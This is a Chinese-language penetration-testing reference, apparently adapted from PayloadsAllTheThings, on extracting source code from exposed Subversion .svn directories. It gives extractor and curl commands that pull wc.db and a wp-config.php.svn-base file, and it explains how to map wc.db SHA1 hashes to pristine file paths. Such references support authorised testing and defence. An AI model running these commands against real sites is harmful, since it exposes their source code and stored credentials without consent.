# Source Code Leak Subversion - SVN源码泄露

[SEARCH_KEYWORDS]
漏洞类型: Source Code Leak Subversion SVN 源码泄露 版本控制泄露
攻击类型: Information Disclosure Source Code Access Credential Exposure
关键词: Subversion SVN .svn wc.db pristine svn-base text-base
技术: svn-extractor wc.db parsing pristine directory hash lookup
工具: svn-extractor rip-svn.pl
文件: .svn/wc.db .svn/pristine/ .svn/text-base/

[CONTENT]

## SVN源码泄露概述

Subversion(简称SVN)是一个集中式版本控制系统。当.svn目录暴露在Web服务器上时，攻击者可以恢复整个源代码仓库，获取敏感信息和凭证。

## 利用工具

### svn-extractor

```powershell
python svn-extractor.py --url "http://target.com/.svn/"
```

## 手动利用

### 方法1: 直接下载文件

```powershell
curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base
```

### 方法2: 通过wc.db数据库

1. 下载SVN数据库:

```powershell
curl http://server/path_to_vulnerable_site/.svn/wc.db -o wc.db
```

2. 分析数据库内容，找到文件SHA1哈希:

```
INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);
```

3. 构建下载路径:
   - 移除`$sha1$`前缀
   - 添加`.svn-base`后缀
   - 使用哈希前两个字符作为`pristine/`子目录

```
http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base
```

## 关键文件路径

| 文件 | 描述 |
|------|------|
| `.svn/wc.db` | SQLite数据库，包含文件信息 |
| `.svn/pristine/XX/` | 文件内容存储目录 |
| `.svn/text-base/` | 基础文件目录(旧版) |
| `.svn/entries` | XML格式条目(旧版) |

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Source Code Management/Subversion.md